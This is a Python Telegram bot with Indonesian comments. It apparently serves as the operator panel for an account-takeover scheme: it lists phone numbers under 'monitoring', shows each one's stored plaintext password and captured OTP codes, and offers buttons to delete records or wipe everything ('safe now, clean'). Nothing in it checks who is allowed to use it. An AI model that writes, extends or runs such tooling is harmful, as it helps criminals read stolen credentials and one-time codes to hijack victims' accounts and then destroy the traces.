from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes
import mysql.connector
from config import BOT_TOKEN, MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE

# Fungsi untuk membuat koneksi ke MySQL
def get_mysql_connection():
    return mysql.connector.connect(
        host=MYSQL_HOST,
        user=MYSQL_USER,
        password=MYSQL_PASSWORD,
        database=MYSQL_DATABASE,
    )

# Fungsi untuk menangani perintah /list
async def list_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_mysql_connection()
    cursor = conn.cursor(dictionary=True)
    cursor.execute('SELECT phone FROM users WHERE monitoring = 1')
    phones = cursor.fetchall()
    conn.close()

    # Buat tombol untuk setiap nomor telepon
    keyboard = [
        [
            InlineKeyboardButton(f"📞 {phone['phone']} {' ' * 10}", callback_data=f"phone_{phone['phone']}"),
            InlineKeyboardButton("🗑️ Hapus", callback_data=f"confirm_delete_{phone['phone']}")
        ]
        for phone in phones
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)

    # Kirim daftar nomor telepon yang dapat diklik
    await update.message.reply_text("Daftar nomor akun:", reply_markup=reply_markup)

# Fungsi untuk menampilkan data nomor
async def show_phone_data(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    conn = get_mysql_connection()
    cursor = conn.cursor(dictionary=True)
    cursor.execute('SELECT message FROM messages WHERE phone = %s', (phone,))
    messages = cursor.fetchall()
    cursor.execute('SELECT password FROM users WHERE phone = %s', (phone,))
    password = cursor.fetchone()
    conn.close()

    response = f"Nomor: {phone}\nPassword: {password['password'] if password else 'N/A'}\n\nKode OTP:\n"
    for message in messages:
        response += f"OTP: {message['message']}\n"

    await update.callback_query.message.reply_text(response or "Tidak ada pesan untuk nomor ini.")

# Fungsi untuk menghapus nomor dari database
async def delete_phone_data(update: Update, context: ContextTypes.DEFAULT_TYPE, phone: str):
    conn = get_mysql_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM messages WHERE phone = %s', (phone,))
    cursor.execute('DELETE FROM users WHERE phone = %s', (phone,))
    conn.commit()
    conn.close()

    await update.callback_query.message.reply_text(f"Data untuk nomor {phone} telah dihapus.")

# Fungsi untuk menangani callback button
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data

    if data.startswith("phone_"):
        phone = data.split("_")[1]
        await show_phone_data(update, context, phone)
    elif data.startswith("confirm_delete_"):
        phone = data.split("_")[2]
        # Tampilkan konfirmasi hapus
        keyboard = [
            [
                InlineKeyboardButton("Ya, hapus", callback_data=f"delete_{phone}"),
                InlineKeyboardButton("Batal", callback_data="cancel_delete")
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.message.reply_text(
            f"Apakah Anda yakin ingin menghapus data untuk nomor {phone}?",
            reply_markup=reply_markup
        )
    elif data.startswith("delete_"):
        phone = data.split("_")[1]
        await delete_phone_data(update, context, phone)
    elif data == "cancel_delete":
        await query.message.reply_text("Penghapusan data dibatalkan.")

# Fungsi untuk menangani perintah /reset
async def reset_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("Ya, hapus", callback_data="reset_yes"),
            InlineKeyboardButton("Jangan hapus", callback_data="reset_no")
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "Apakah Anda yakin ingin menghapus semua data? data tidak dapat di kembalikan setelah di hapus.",
        reply_markup=reply_markup
    )

# Fungsi untuk menghapus semua data di database
async def confirm_reset_database(update: Update, context: ContextTypes.DEFAULT_TYPE):
    conn = get_mysql_connection()
    cursor = conn.cursor()
    cursor.execute('DELETE FROM messages')
    cursor.execute('DELETE FROM users')
    conn.commit()
    conn.close()
    await update.callback_query.message.reply_text("Aman sudah , bersih.")

# Konfigurasi bot Telegram
app = ApplicationBuilder().token(BOT_TOKEN).build()

# Menambahkan handler untuk perintah /list dan /reset
app.add_handler(CommandHandler("list", list_numbers))
app.add_handler(CommandHandler("reset", reset_database))

# Menambahkan handler untuk tombol callback
app.add_handler(CallbackQueryHandler(button_handler))

# Menjalankan bot
app.run_polling()
